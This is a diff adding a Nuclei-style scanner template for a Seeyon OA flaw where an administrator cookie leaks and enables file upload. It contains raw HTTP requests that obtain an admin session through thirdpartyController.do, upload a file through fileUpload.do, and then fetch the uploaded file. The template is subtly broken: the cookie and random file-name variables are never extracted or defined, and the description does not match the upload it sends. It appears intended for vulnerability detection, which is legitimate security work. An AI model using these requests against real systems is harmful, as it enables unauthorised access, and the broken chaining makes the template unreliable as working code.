@@ -1,0 +1,79 @@
+id: seeyon-oa-cookie-leakage-file-upload
+
+info:
+  name: Seeyon OA Administrator Cookie Leakage File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects the leakage of administrator cookies in Seeyon OA systems, which allows arbitrary file upload via exploiting the decompression process during the upload of a compressed file.
+  tags: file-upload,oast
+
+variables:
+  boundary: "59229605f98b8cf290a7b8908b34616b"
+  payload: |
+    --{{boundary}}\r\n
+    Content-Disposition: form-data; name="firstSave"\r\n\r\n
+    true\r\n
+    --{{boundary}}\r\n
+    Content-Disposition: form-data; name="callMethod"\r\n\r\n
+    resizeLayout\r\n
+    --{{boundary}}\r\n
+    Content-Disposition: form-data; name="isEncrypt"\r\n\r\n
+    0\r\n
+    --{{boundary}}\r\n
+    Content-Disposition: form-data; name="takeOver"\r\n\r\n
+    false\r\n
+    --{{boundary}}\r\n
+    Content-Disposition: form-data; name="type"\r\n\r\n
+    0\r\n
+    --{{boundary}}\r\n
+    Content-Disposition: form-data; name="file1"; filename="11.png"\r\n
+    Content-Type: image/png\r\n\r\n
+    dummy_payload_content\r\n
+    --{{boundary}}--
+
+http:
+  - raw:
+      - |
+        POST /seeyon/thirdpartyController.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+      - type: regex
+        part: header
+        regex:
+          - "JSESSIONID"
+
+  - raw:
+      - |
+        POST /seeyon/fileUpload.do?method=processUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        Cookie: {{cookie}}
+
+        {{payload}}
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "fileurls=fileurls\\+\"\\+\"\\+'([\\-\\d]+)'"
+
+  - raw:
+      - |
+        GET /seeyon/common/designer/pageLayout/{{randomFileName}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
